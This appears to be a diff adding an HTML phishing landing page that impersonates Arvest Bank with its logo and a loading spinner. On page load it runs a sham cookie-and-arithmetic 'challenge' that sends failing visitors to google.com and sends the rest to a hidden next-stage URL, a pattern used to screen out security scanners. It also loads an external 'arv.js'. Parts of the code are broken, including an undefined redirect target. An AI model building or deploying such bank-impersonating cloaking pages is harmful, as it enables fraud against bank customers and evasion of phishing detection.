@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>...</title>
+<script src="arv.js"></script>
+<style>
+    body {
+        font-family: 'Arial', sans-serif;
+        transition: filter 0.3s; /* for a smooth fade */
+    }
+
+    #myModal {
+        display: block;
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background-color: rgba(0, 0, 0, 0.7); 
+        backdrop-filter: blur(8px);
+        z-index: 1;
+    }
+
+    .modal-content {
+        position: absolute; /* To center the modal vertically and horizontally */
+        top: 40%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background-color: #fff; 
+        padding: 40px; 
+        border-radius: 1px; 
+        box-shadow: 0 10px 20px rgba(0, 0, 0, 0.15);
+        width: 60%; 
+        max-width: 300px;
+    }
+
+    input[type="text"] {
+        width: 94%;
+        padding: 10px 3px; 
+        margin-bottom: 15px;
+        border: 2px solid #eaeaea;
+        border-radius: 1px;
+        transition: border-color 0.3s;
+    }
+
+    input[type="text"]:focus {
+        outline: none;
+        border-color: #007BFF;
+    }
+
+    button {
+        width: 100%;
+        background-color: #007BFF;
+        color: white;
+        padding: 10px 15px;
+        border: none;
+        border-radius: 1px;
+        cursor: pointer;
+        transition: background-color 0.3s, transform 0.3s;
+    }
+
+    button:hover {
+        background-color: #0056b3;
+        transform: translateY(-2px); /* Gives a slight lift to the button when hovered */
+    }
+
+    button:active {
+        transform: translateY(1px); 
+    }
+</style>
+
+<script>
+        function getParameterByName() {
+            urldata = window.location.search;
+            rdata = urldata.split("/");
+            return rdata[1];
+        }
+
+        function proceedWithRedirection() {
+            var int = 3000
+            // Set a cookie for the JS challenge
+            document.cookie = "js_challenge=passed; path=/;";
+            setTimeout(() => {
+
+                // Math challenge: setting the result in a hidden input
+                let result = 3 + 4;
+                document.getElementById('jsChallengeResult').value = result;
+
+                function redirectDueToFailure() {
+                    window.location.href = "https://google.com";
+                }
+                
+                let cookieCheck = document.cookie.includes("js_challenge=passed");
+
+                if (!cookieCheck) {
+                    redirectDueToFailure();
+                    return;
+                }
+            
+                // Math challenge check
+                let challengeResult = document.getElementById('jsChallengeResult').value;
+                if (challengeResult != "7") { 
+                    redirectDueToFailure();
+                    return;
+                }
+                
+                let newUrl = Youtube;
+                window.location.href = newUrl;
+            }, int);
+        }
+</script>
+</head>
+
+<body onload="proceedWithRedirection()">
+
+<div id="myModal">
+    <div class="modal-content">
+        <center>
+         <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Arvest_Bank_logo.svg" alt="Image Image" width="200" height="42">
+          </center>
+        <p style="display: flex; 
+        justify-content: center; 
+        align-items: center; "><img src="https://th.bing.com/th/id/R.aaaf80ba7a992e06d59f870aa2de1cbf?rik=DZNYIKZt8V41Dw&pid=ImgRaw&r=0" width="40" height="40" /></p>
+        
+    </div>
+</div>
+
+<input type="hidden" id="jsChallengeResult" value="">
+<br><br><br><p></p><br><br>
+If you are not redirected, <a href="https://google.com/">click here</a>.
+
+</body>
+
+</html>
